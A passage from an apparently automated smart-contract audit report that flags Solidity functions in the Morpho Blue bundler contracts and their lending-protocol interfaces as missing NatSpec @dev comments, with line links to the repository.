279:     function _isSenderAuthorized() internal view virtual override returns (bool) {

```

[26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L26), [34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54), [65](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L65), [263](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L263), [279](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L279)

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

/// @audit missed @dev
28:     function approve2(IAllowanceTransfer.PermitSingle calldata permitSingle, bytes calldata signature, bool skipRevert)

/// @audit missed @dev
43:     function transferFrom2(address asset, uint256 amount) external payable protected {

```

[28](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L28), [43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L43)

```solidity
File: morpho-blue-bundlers/src/PermitBundler.sol

/// @audit missed @dev
22:     function permit(address asset, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, bool skipRevert)

```

[22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L22)

```solidity
File: morpho-blue-bundlers/src/TransferBundler.sol

/// @audit missed @dev
59:     function erc20TransferFrom(address asset, uint256 amount) external payable protected {

```

[59](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L59)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

/// @audit missed @dev
34:     constructor(address morpho) WNativeBundler(MainnetLib.WETH) MorphoBundler(morpho) {}

/// @audit missed @dev
39:     function _isSenderAuthorized() internal view override(BaseBundler, MorphoBundler) returns (bool) {

```

[34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L39)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

/// @audit missed @dev
24:     function permitDai(uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s, bool skipRevert)

```

[24](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L24)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumStEthBundler.sol

/// @audit missed @dev
15:     constructor() StEthBundler(MainnetLib.WST_ETH) {}

```

[15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumStEthBundler.sol#L15)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

/// @audit missed @dev
6:     function nonces(address holder) external view returns (uint256);

/// @audit missed @dev
16:     function permit(

```

[6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L6), [16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L16)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMulticall.sol

/// @audit missed @dev
11:     function multicall(bytes[] calldata data) external payable;

```

[11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMulticall.sol#L11)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

/// @audit missed @dev
5:     function transferShares(address _recipient, uint256 _sharesAmount) external returns (uint256);

/// @audit missed @dev
7:     function getPooledEthByShares(uint256 _sharesAmount) external view returns (uint256);

/// @audit missed @dev
9:     function getSharesByPooledEth(uint256 _stEthAmount) external view returns (uint256);

/// @audit missed @dev
11:     function getCurrentStakeLimit() external view returns (uint256);

/// @audit missed @dev
13:     function submit(address _referral) external payable returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L13)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

/// @audit missed @dev
5:     function deposit() external payable;

/// @audit missed @dev
6:     function withdraw(uint256 wad) external;

/// @audit missed @dev
7:     function approve(address guy, uint256 wad) external returns (bool);

/// @audit missed @dev
8:     function transferFrom(address src, address dst, uint256 wad) external returns (bool);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L5), [6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L6), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L8)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

/// @audit missed @dev
5:     function DOMAIN_SEPARATOR() external view returns (bytes32);

/// @audit missed @dev
7:     function allowance(address owner, address spender) external view returns (uint256);

/// @audit missed @dev
8:     function approve(address spender, uint256 amount) external returns (bool);

/// @audit missed @dev
9:     function balanceOf(address account) external view returns (uint256);

/// @audit missed @dev
10:     function decimals() external view returns (uint8);

/// @audit missed @dev
11:     function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

/// @audit missed @dev
12:     function getStETHByWstETH(uint256 wstETHAmount) external view returns (uint256);

/// @audit missed @dev
13:     function getWstETHByStETH(uint256 stETHAmount) external view returns (uint256);

/// @audit missed @dev
14:     function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

/// @audit missed @dev
15:     function name() external view returns (string memory);

/// @audit missed @dev
16:     function nonces(address owner) external view returns (uint256);

/// @audit missed @dev
17:     function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)

/// @audit missed @dev
19:     function stETH() external view returns (address);

/// @audit missed @dev
20:     function stEthPerToken() external view returns (uint256);

/// @audit missed @dev
21:     function symbol() external view returns (string memory);

/// @audit missed @dev
22:     function tokensPerStEth() external view returns (uint256);

/// @audit missed @dev
23:     function totalSupply() external view returns (uint256);

/// @audit missed @dev
24:     function transfer(address recipient, uint256 amount) external returns (bool);

/// @audit missed @dev
25:     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

/// @audit missed @dev
26:     function unwrap(uint256 wstETHAmount) external returns (uint256);

/// @audit missed @dev
27:     function wrap(uint256 stETHAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L8), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L9), [10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L10), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L11), [12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L12), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L13), [14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L14), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L15), [16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L16), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L19), [20](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L20), [21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L21), [22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L22), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L23), [24](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L24), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L25), [26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L26), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L27)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

/// @audit missed @dev
29:     constructor(address morpho, address aaveV2Pool, address wstEth) MigrationBundler(morpho) StEthBundler(wstEth) {

/// @audit missed @dev
64:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MigrationBundler) returns (bool) {

```

[29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L29), [64](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L64)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

/// @audit missed @dev
26:     constructor(address morpho, address aaveV3Pool) MigrationBundler(morpho) {

```

[26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L26)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

/// @audit missed @dev
29:     constructor(address morpho, address wNative, address cEth) WNativeBundler(wNative) MigrationBundler(morpho) {

/// @audit missed @dev
78:     function _isSenderAuthorized() internal view override(BaseBundler, MigrationBundler) returns (bool) {

```

[29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L29), [78](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L78)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

/// @audit missed @dev
19:     constructor(address morpho) MigrationBundler(morpho) {}

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L19)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

/// @audit missed @dev
22:     constructor(address morpho) MorphoBundler(morpho) {}

/// @audit missed @dev
27:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MorphoBundler) returns (bool) {

```

[22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L22), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L27)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

/// @audit missed @dev
104:     function repay(address asset, uint256 amount, uint256 rateMode, address onBehalfOf) external returns (uint256);

/// @audit missed @dev
209:     function initReserve(

/// @audit missed @dev
217:     function setReserveInterestRateStrategyAddress(address reserve, address rateStrategyAddress) external;

/// @audit missed @dev
219:     function setConfiguration(address reserve, uint256 configuration) external;

/// @audit missed @dev
243:     function finalizeTransfer(

/// @audit missed @dev
252:     function getReservesList() external view returns (address[] memory);

/// @audit missed @dev
254:     function getAddressesProvider() external view returns (address);

/// @audit missed @dev
256:     function setPause(bool val) external;

/// @audit missed @dev
258:     function paused() external view returns (bool);

/// @audit missed @dev
260:     function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);

```

[104](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L104), [209](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L209), [217](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L217), [219](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L219), [243](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L243), [252](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L252), [254](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L254), [256](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L256), [258](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L258), [260](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L260)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

/// @audit missed @dev
70:     function mintUnbacked(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

/// @audit missed @dev
79:     function backUnbacked(address asset, uint256 amount, uint256 fee) external returns (uint256);

/// @audit missed @dev
92:     function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

/// @audit missed @dev
109:     function supplyWithPermit(

/// @audit missed @dev
131:     function withdraw(address asset, uint256 amount, address to) external returns (uint256);

/// @audit missed @dev
148:     function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)

/// @audit missed @dev
164:     function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf)

/// @audit missed @dev
185:     function repayWithPermit(

/// @audit missed @dev
217:     function swapBorrowRateMode(address asset, uint256 interestRateMode) external;

/// @audit missed @dev
228:     function rebalanceStableBorrowRate(address asset, address user) external;

/// @audit missed @dev
235:     function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

/// @audit missed @dev
249:     function liquidationCall(

/// @audit missed @dev
315:     function getUserAccountData(address user)

/// @audit missed @dev
365:     function getReserveNormalizedIncome(address asset) external view returns (uint256);

/// @audit missed @dev
386:     function getReserveData(address asset) external view returns (ReserveData memory);

/// @audit missed @dev
420:     function getReserveAddressById(uint16 id) external view returns (address);

/// @audit missed @dev
426:     function ADDRESSES_PROVIDER() external view returns (address);

/// @audit missed @dev
432:     function updateBridgeProtocolFee(uint256 bridgeProtocolFee) external;

/// @audit missed @dev
450:     function setUserEMode(uint8 categoryId) external;

/// @audit missed @dev
457:     function getUserEMode(address user) external view returns (uint256);

/// @audit missed @dev
470:     function MAX_STABLE_RATE_BORROW_SIZE_PERCENT() external view returns (uint256);

/// @audit missed @dev
476:     function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);

/// @audit missed @dev
482:     function BRIDGE_PROTOCOL_FEE() external view returns (uint256);

/// @audit missed @dev
488:     function FLASHLOAN_PREMIUM_TO_PROTOCOL() external view returns (uint128);

/// @audit missed @dev
494:     function MAX_NUMBER_RESERVES() external view returns (uint16);

/// @audit missed @dev
500:     function mintToTreasury(address[] calldata assets) external;

/// @audit missed @dev
508:     function rescueTokens(address token, address to, uint256 amount) external;

```

[70](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L70), [79](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L79), [92](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L92), [109](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L109), [131](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L131), [148](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L148), [164](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L164), [185](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L185), [217](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L217), [228](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L228), [235](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L235), [249](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L249), [315](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L315), [365](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L365), [386](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L386), [420](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L420), [426](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L426), [432](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L432), [450](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L450), [457](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L457), [470](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L470), [476](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L476), [482](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L482), [488](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L488), [494](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L494), [500](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L500), [508](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L508)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit missed @dev
5:     function repayBorrowBehalf(address borrower) external payable;

/// @audit missed @dev
7:     function balanceOf(address) external view returns (uint256);

/// @audit missed @dev
9:     function exchangeRateStored() external view returns (uint256);

/// @audit missed @dev
11:     function redeem(uint256 redeemTokens) external returns (uint256);

/// @audit missed @dev
13:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

/// @audit missed @dev
15:     function borrow(uint256 borrowAmount) external returns (uint256);

/// @audit missed @dev
17:     function mint() external payable;

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L17)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit missed @dev
5:     function underlying() external returns (address);

/// @audit missed @dev
7:     function balanceOf(address) external view returns (uint256);

/// @audit missed @dev
9:     function exchangeRateStored() external view returns (uint256);

/// @audit missed @dev
11:     function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);

/// @audit missed @dev
13:     function redeem(uint256 redeemTokens) external returns (uint256);

/// @audit missed @dev
15:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

/// @audit missed @dev
17:     function borrow(uint256 borrowAmount) external returns (uint256);

/// @audit missed @dev
19:     function mint(uint256 mintAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L19)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @dev
21:     function name() external view returns (string memory);

/// @audit missed @dev
23:     function version() external view returns (string memory);

/// @audit missed @dev
25:     function baseToken() external view returns (address);

/// @audit missed @dev
27:     function userCollateral(address account, address asset) external view returns (uint256);

/// @audit missed @dev
29:     function balanceOf(address account) external view returns (uint256);

/// @audit missed @dev
31:     function borrowBalanceOf(address account) external view returns (uint256);

/// @audit missed @dev
33:     function supply(address asset, uint256 amount) external;

/// @audit missed @dev
35:     function supplyTo(address dst, address asset, uint256 amount) external;

/// @audit missed @dev
37:     function supplyFrom(address from, address dst, address asset, uint256 amount) external;

/// @audit missed @dev
39:     function withdraw(address asset, uint256 amount) external;

/// @audit missed @dev
41:     function withdrawFrom(address src, address to, address asset, uint256 amount) external;

/// @audit missed @dev
43:     function allowBySig(

```

[21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L21), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L23), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L25), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L27), [29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L29), [31](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L31), [33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L33), [35](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L35), [37](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L37), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L39), [41](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L41), [43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L43)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

/// @audit missed @dev
5:     function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L5)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

